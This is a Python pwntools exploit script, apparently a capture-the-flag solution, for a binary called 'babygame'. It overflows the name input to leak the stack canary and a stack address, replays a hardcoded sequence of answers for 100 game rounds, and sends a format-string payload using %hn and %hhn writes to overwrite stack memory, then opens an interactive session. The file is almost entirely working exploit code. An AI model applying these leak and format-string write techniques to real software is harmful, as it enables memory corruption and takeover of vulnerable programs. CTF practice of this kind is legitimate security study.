# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

#io = remote('', )
# libc = ELF('./libc-2.31.so')
io = process('babygame')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size):
	sl('1')
	sla('Index?\n',str(idx))
	sla('Size?\n',str(size))
def show(idx):
	sl('2')
	sla('Index?\n',str(idx))
	
def edit(idx,content):
	sl('3')
	sla('Index?\n',str(idx))
	sa('content:\n',content)
		
def delete(idx):
	sl('4')
	sla('Index?\n',str(idx))

# dbg()
sa('your name:\n','a'*0x108+'a')
ru('a'*0x109)
canary = u64(rn(7).rjust(8,'\x00'))
stack = u64(rn(6).ljust(8,'\x00'))
# data = io.recvuntil("\x7f")[-13:].ljust(13,"\x00")
# canary = data[:14]
# libcbase = data[14:26]
# print libcbase
lg('stack')
lg('canary')
rand = [1,2,0,2,2,1,2,2,1,1,2,0,2,1,1,1,1,2,2,1,2,0,1,2,0,1,1,1,0,2,2,1,0,0,2,2,1,2,2,0,1,2,0,0,0,2,0,0,1,0,1,0,0,0,1,1,1,0,0,2,0,0,1,1,0,1,0,2,1,0,2,2,0,2,0,0,2,1,1,0,1,1,2,2,1,0,1,0,0,2,0,1,0,2,2,0,1,0,0,2]
input_m = []
for i in range(100):
	if rand[i] == 1:
		sla('round %s: \n'%str(i+1),'2')
	elif rand[i] == 2:
		sla('round %s: \n'%str(i+1),'0')
	elif rand[i] == 0:
		sla('round %s: \n'%str(i+1),'1')

pro = stack - 0x338
pay = '%'+str(pro&0xffff)+'c%81$hn'+'%28c%109$hhn'
pay = pay.ljust(0x30,'d')
# pay += p64(canary)
dbg()
sn(pay)
#%79$paaa%41$pbbb%39$pccc
#%57c%41$hhnddddd
irt()


